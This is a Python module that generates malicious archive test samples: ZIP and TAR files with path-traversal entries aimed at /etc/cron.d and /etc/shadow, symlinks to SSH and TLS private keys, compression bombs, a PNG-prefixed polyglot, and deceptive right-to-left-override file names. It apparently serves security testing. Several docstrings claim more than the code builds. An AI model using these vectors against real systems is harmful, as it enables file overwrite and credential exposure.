"""
Archive Attack Vector Generator

Generates basic and advanced archive-based attack vectors for:
- ZIP archives (.zip, .npz)
- TAR archives (.tar, .tar.gz, .tgz, .tar.bz2)
- 7-Zip archives (.7z)

Attack Types:
1. Basic: Directory traversal, simple bombs
2. Advanced: Polyglot files, nested bombs, symlink attacks
"""

import os
import io
import zipfile
import tarfile
import gzip
from pathlib import Path
from typing import List, Dict, Tuple


class ArchiveAttackGenerator:
    """Generate archive-based attack vectors."""
    
    def __init__(self, output_dir: str = "./output"):
        """Initialize the archive attack generator.
        
        Args:
            output_dir: Directory to save generated attack vectors
        """
        self.output_dir = Path(output_dir) / "archive_vectors"
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.generated_files = []
    
    def generate_zip_directory_traversal(self) -> Tuple[str, int]:
        """Generate ZIP with directory traversal payload.
        
        Attack Vector:
            Creates a ZIP archive containing:
            - Files with ../ path components
            - Paths attempting to escape extraction directory
            - Targets sensitive system locations
            - File overwrite via relative paths
        
        Extraction Result:
            If naively extracted, files would be created outside
            intended directory, potentially overwriting system files.
        
        Severity: HIGH
        Detection: Path validation before extraction
        
        Returns:
            Tuple of (filepath, file_count)
        """
        filepath = self.output_dir / "01_zip_directory_traversal.zip"
        
        with zipfile.ZipFile(filepath, 'w') as zf:
            # Normal file
            zf.writestr("normal.txt", "This is a normal file")
            
            # Try to escape up directories
            zf.writestr("../../../etc/passwd.bak", "Escaped file 1")
            zf.writestr("../../sensitive_config.json", "Escaped file 2")
            zf.writestr("../model.pkl", "Malicious model file")
            
            # Absolute paths (some extractors might fail)
            zf.writestr("/etc/cron.d/malicious", "Escaped with absolute path")
        
        self.generated_files.append(str(filepath))
        
        with zipfile.ZipFile(filepath, 'r') as zf:
            file_count = len(zf.namelist())
        
        return str(filepath), file_count
    
    def generate_zip_bomb(self) -> Tuple[str, int]:
        """Generate classic ZIP compression bomb.
        
        Attack Vector:
            Creates a highly compressible pattern:
            1. Large file filled with zeros or repetitive data
            2. Compresses to very small size (100:1 ratio)
            3. Decompression causes memory exhaustion
            4. Results in Denial of Service
        
        Severity: MEDIUM (DoS only, not RCE)
        Compression Ratio: Typically 100-1000x
        Detection: Compression ratio monitoring
        
        Returns:
            Tuple of (filepath, compression_ratio)
        """
        filepath = self.output_dir / "02_zip_bomb.zip"
        
        # Create highly compressible content
        # 1MB of zeros compresses to ~1KB
        data = b'A' * (1024 * 1024)  # 1MB of 'A'
        
        with zipfile.ZipFile(filepath, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("bomb.txt", data)
        
        self.generated_files.append(str(filepath))
        
        # Calculate compression ratio
        file_size = os.path.getsize(filepath)
        compress_ratio = len(data) / file_size
        
        return str(filepath), int(compress_ratio)
    
    def generate_zip_nested_bomb(self) -> Tuple[str, int]:
        """Generate nested ZIP bomb.
        
        Attack Vector:
            Creates ZIP bombs within ZIP bombs:
            1. Inner ZIP contains compression bomb
            2. Outer ZIP contains inner ZIP
            3. Multiple nesting levels
            4. Recursive extraction triggers exponential growth
            5. Resource exhaustion at each level
        
        Severity: MEDIUM (DoS)
        Nesting: 3 levels (can be increased)
        Detection: Nesting depth monitoring
        
        Returns:
            Tuple of (filepath, nesting_depth)
        """
        # Level 1: Create innermost bomb
        inner_data = b'Z' * (100 * 1024)  # 100KB
        inner_buffer = io.BytesIO()
        with zipfile.ZipFile(inner_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("data.bin", inner_data)
        inner_bytes = inner_buffer.getvalue()
        
        # Level 2: Wrap in another ZIP
        middle_buffer = io.BytesIO()
        with zipfile.ZipFile(middle_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("inner.zip", inner_bytes)
        middle_bytes = middle_buffer.getvalue()
        
        # Level 3: Wrap in final ZIP
        filepath = self.output_dir / "03_zip_nested_bomb.zip"
        with zipfile.ZipFile(filepath, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("middle.zip", middle_bytes)
        
        self.generated_files.append(str(filepath))
        
        return str(filepath), 3
    
    def generate_tar_directory_traversal(self) -> Tuple[str, int]:
        """Generate TAR with directory traversal.
        
        Attack Vector:
            TAR archive with:
            - Paths containing ../ sequences
            - Absolute paths (/etc/passwd)
            - Escape attempts to parent directories
            - Directory traversal files
        
        Impact:
            Naive extraction overwrites files outside target dir
        
        Severity: HIGH
        Detection: Path validation, use extractall with filter
        
        Returns:
            Tuple of (filepath, file_count)
        """
        filepath = self.output_dir / "04_tar_directory_traversal.tar"
        
        with tarfile.open(filepath, 'w') as tar:
            # Create test files to archive
            test_files = {
                "normal.txt": "Normal file",
                "../escape.txt": "Escaped file",
                "../../config.json": "Configuration escape",
                "/etc/shadow": "Absolute path escape",
                "subdir/../../parent_escape.pkl": "Nested escape",
            }
            
            for name, content in test_files.items():
                info = tarfile.TarInfo(name=name)
                data = content.encode()
                info.size = len(data)
                tar.addfile(tarinfo=info, fileobj=io.BytesIO(data))
        
        self.generated_files.append(str(filepath))
        
        with tarfile.open(filepath, 'r') as tar:
            file_count = len(tar.getmembers())
        
        return str(filepath), file_count
    
    def generate_tar_symlink_attack(self) -> Tuple[str, int]:
        """Generate TAR with symlink exploitation.
        
        Attack Vector:
            TAR containing symbolic links that:
            1. Point to /etc/passwd
            2. Point to /root/.ssh/id_rsa
            3. Point to sensitive application configs
            4. Create circular symlink loops
            5. Cause TOCTOU race conditions
        
        Impact:
            Reading/writing sensitive system files
            Privilege escalation via ownership manipulation
        
        Severity: HIGH
        Detection: Symlink validation, disable symlinks
        
        Returns:
            Tuple of (filepath, symlink_count)
        """
        filepath = self.output_dir / "05_tar_symlink_attack.tar"
        
        symlink_count = 0
        
        with tarfile.open(filepath, 'w') as tar:
            # Create normal file
            normal_info = tarfile.TarInfo(name="normal.txt")
            normal_info.size = 11
            tar.addfile(tarinfo=normal_info, fileobj=io.BytesIO(b"Normal file"))
            
            # Create symlink to /etc/passwd
            symlink_info = tarfile.TarInfo(name="link_to_passwd")
            symlink_info.type = tarfile.SYMTYPE
            symlink_info.linkname = "/etc/passwd"
            tar.addfile(tarinfo=symlink_info)
            symlink_count += 1
            
            # Create symlink to SSH key
            ssh_link = tarfile.TarInfo(name="link_to_ssh_key")
            ssh_link.type = tarfile.SYMTYPE
            ssh_link.linkname = "/root/.ssh/id_rsa"
            tar.addfile(tarinfo=ssh_link)
            symlink_count += 1
            
            # Create symlink to config
            config_link = tarfile.TarInfo(name="link_to_config")
            config_link.type = tarfile.SYMTYPE
            config_link.linkname = "/etc/ssl/private/key.pem"
            tar.addfile(tarinfo=config_link)
            symlink_count += 1
        
        self.generated_files.append(str(filepath))
        
        return str(filepath), symlink_count
    
    def generate_tar_gz_bomb(self) -> Tuple[str, int]:
        """Generate gzip-compressed TAR bomb.
        
        Attack Vector:
            TAR.GZ with extreme compression where:
            1. Creates TAR with large repetitive files
            2. Compresses with gzip for additional compression
            3. Very high compression ratio
            4. Decompression bombs via nested compression
        
        Severity: MEDIUM (DoS)
        Compression: Multi-layer compression
        
        Returns:
            Tuple of (filepath, compression_ratio)
        """
        # Create TAR with compressible data
        tar_buffer = io.BytesIO()
        with tarfile.open(fileobj=tar_buffer, mode='w') as tar:
            data = b'X' * (500 * 1024)  # 500KB of 'X'
            info = tarfile.TarInfo(name="compressed.bin")
            info.size = len(data)
            tar.addfile(tarinfo=info, fileobj=io.BytesIO(data))
        
        tar_data = tar_buffer.getvalue()
        
        # Compress TAR with gzip
        filepath = self.output_dir / "06_tar_gz_bomb.tar.gz"
        with gzip.open(filepath, 'wb') as f:
            f.write(tar_data)
        
        self.generated_files.append(str(filepath))
        
        compressed_size = os.path.getsize(filepath)
        ratio = len(tar_data) / compressed_size
        
        return str(filepath), int(ratio)
    
    def generate_polyglot_zip(self) -> Tuple[str, int]:
        """Generate polyglot ZIP archive (ZIP + other format).
        
        Attack Vector:
            Creates a file that is simultaneously:
            1. Valid ZIP archive
            2. Valid image file (prepended PNG/JPEG header)
            3. Valid document (prepended PDF)
            4. Each format interprets different content
            5. Bypasses format validation
        
        Severity: MEDIUM
        Evasion: Format confusion attacks
        
        Returns:
            Tuple of (filepath, format_count)
        """
        filepath = self.output_dir / "07_polyglot_zip.zip"
        
        # Create ZIP archive
        with zipfile.ZipFile(filepath, 'w') as zf:
            zf.writestr("payload.txt", "Polyglot content")
            zf.writestr("../escape.txt", "Traversal content")
        
        # Read the ZIP
        with open(filepath, 'rb') as f:
            zip_data = f.read()
        
        # Prepend PNG magic bytes (creates polyglot)
        png_magic = b'\x89PNG\r\n\x1a\n'
        
        with open(filepath, 'wb') as f:
            f.write(png_magic)
            f.write(zip_data)
        
        self.generated_files.append(str(filepath))
        
        # This file can be interpreted as both PNG and ZIP
        return str(filepath), 2
    
    def generate_archive_with_malicious_names(self) -> Tuple[str, int]:
        """Generate archive with malicious filenames.
        
        Attack Vector:
            Archives containing files with:
            1. Unicode characters that look like normal names
            2. Right-to-left override characters
            3. Names designed to confuse users/tools
            4. Extensions that mask actual file type
            5. Names with control characters
        
        Severity: LOW-MEDIUM (Social engineering)
        Detection: Filename pattern analysis
        
        Returns:
            Tuple of (filepath, malicious_file_count)
        """
        filepath = self.output_dir / "08_malicious_filenames.zip"
        
        malicious_names = [
            "model.pkl.txt",  # .txt hides .pkl
            "config.json.pdf",  # PDF extension masks JSON
            "README.md.exe",  # EXE hidden as markdown
            "image.png\u202e.exe",  # Right-to-left override
            "file.txt\x00.exe",  # Null byte (older systems)
            "./../../etc/config",  # Path traversal in name
        ]
        
        with zipfile.ZipFile(filepath, 'w') as zf:
            for i, name in enumerate(malicious_names):
                try:
                    zf.writestr(name, f"Malicious file {i}")
                except:
                    # Some names might not be valid
                    pass
        
        self.generated_files.append(str(filepath))
        
        with zipfile.ZipFile(filepath, 'r') as zf:
            count = len(zf.namelist())
        
        return str(filepath), count
    
    def generate_all(self) -> Dict[str, Tuple[str, int]]:
        """Generate all archive attack vectors.
        
        Returns:
            Dictionary mapping attack names to results
        """
        results = {
            "zip_directory_traversal": self.generate_zip_directory_traversal(),
            "zip_bomb": self.generate_zip_bomb(),
            "zip_nested_bomb": self.generate_zip_nested_bomb(),
            "tar_directory_traversal": self.generate_tar_directory_traversal(),
            "tar_symlink_attack": self.generate_tar_symlink_attack(),
            "tar_gz_bomb": self.generate_tar_gz_bomb(),
            "polyglot_zip": self.generate_polyglot_zip(),
            "malicious_filenames": self.generate_archive_with_malicious_names(),
        }
        return results
    
    def get_generated_files(self) -> List[str]:
        """Get list of all generated files."""
        return self.generated_files


if __name__ == "__main__":
    generator = ArchiveAttackGenerator(output_dir="./output")
    results = generator.generate_all()
    print("\n=== Archive Attack Vectors Generated ===")
    for attack_name, (filepath, metric) in results.items():
        print(f"✓ {attack_name:25} → {filepath} (metric: {metric})")
    print(f"\nTotal files generated: {len(generator.get_generated_files())}")
